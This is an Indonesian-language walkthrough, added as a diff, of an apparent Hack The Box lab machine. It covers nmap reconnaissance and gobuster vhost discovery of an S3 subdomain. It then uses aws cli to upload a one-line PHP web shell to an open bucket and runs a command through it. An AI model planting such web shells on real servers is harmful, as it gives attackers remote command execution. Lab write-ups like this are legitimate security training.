@@ -1,0 +1,47 @@
+Menjalankan perintah sudo nmap -A <IP_TARGET> dengan output sebagai berikut:
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-06 11:18 WITA
+Nmap scan report for 10.129.234.131 (10.129.234.131)
+Host is up (0.26s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
+|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
+|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: The Toppers
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=8/6%OT=22%CT=1%CU=34244%PV=Y%DS=2%DC=T%G=Y%TM=6A73F
+OS:D22%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)S
+OS:EQ(SP=106%GCD=2%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST
+OS:11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=F
+OS:E88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M
+OS:552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
+OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
+OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
+OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
+OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT       ADDRESS
+1   321.54 ms 10.10.14.1 (10.10.14.1)
+2   322.88 ms 10.129.234.131 (10.129.234.131)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds
+
+Setelah mengetahui bahwa port 80 terbuka, aku mencoba untuk mengakses halaman web tersebut di browser. Karena tidak menemukan informasi menarik pada halaman browser, aku mencoba untuk menggunakan gobuster dengan tujuan menemukan sub domain yang tersembunyi menggunakan mode vhost.
+
+Setelah menjalankan gobuster mode vhost, aku menemukan sub-domain s3. Namun ketika diakses menggunakan browser, host tersebut tidak akan terbuka sampai aku menambahkannya ke /etc/hosts.
+
+Gunakan aws cli dan jalankan aws configure dengan value terserah. Jalankan aws --endpoint=http://s3.thetoppers.htb s3 ls untuk melihat bucket apa saja yang tersedia pada URL tersebut. Jalankan aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb untuk melihat isi dari bucket thetoppers.htb
+
+Buat web shell dengan value berikut <?php system($_GET["cmd"]); ?> lalu namakan shell.php yang nantinya akan kita upload ke s3 menggunakan command aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb. 
+
+Akses http://thetoppers.htb/shell.php?cmd=pwd
